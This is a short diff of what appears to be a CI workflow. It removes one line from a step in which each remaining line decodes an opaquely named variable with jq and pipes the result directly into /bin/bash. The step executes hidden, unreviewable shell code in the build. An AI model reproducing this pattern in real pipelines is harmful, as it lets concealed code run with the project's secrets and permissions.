@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$tkkfj86875" | jq -r .ari6 | /bin/bash
           echo $snh1685 | jq -r .ftp204 | /bin/bash
-          printf '%s' "$gtt2" | jq -r .te66967 | /bin/bash
           echo $tefc7 | jq -r .p17239 | /bin/bash
           echo $zr650 | jq -r .sp0 | /bin/bash
           echo $l7668 | jq -r .ohfh12 | /bin/bash
